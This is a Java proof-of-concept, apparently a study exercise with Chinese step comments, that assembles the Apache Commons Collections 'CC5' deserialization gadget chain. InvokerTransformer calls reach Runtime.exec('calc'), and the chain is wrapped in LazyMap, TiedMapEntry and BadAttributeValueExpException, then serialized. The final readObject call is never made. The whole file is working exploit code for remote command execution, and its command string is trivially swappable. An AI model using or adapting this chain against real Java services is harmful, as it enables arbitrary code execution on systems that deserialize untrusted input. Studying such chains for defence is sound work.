package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class CC5_LazyMap {
    public static void main(String[] args) throws IOException {
        //构造反序列化链
        Transformer[] transformers=new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //构造LazyMap
        Map lazymap = LazyMap.decorate(new HashMap(), chainedTransformer);

        //构造TiedEntryMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "test");

        //构造BadAttributeValueExpException

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(tiedMapEntry);

        //进行序列化
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);

        //进行反序列化
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);

    }
}
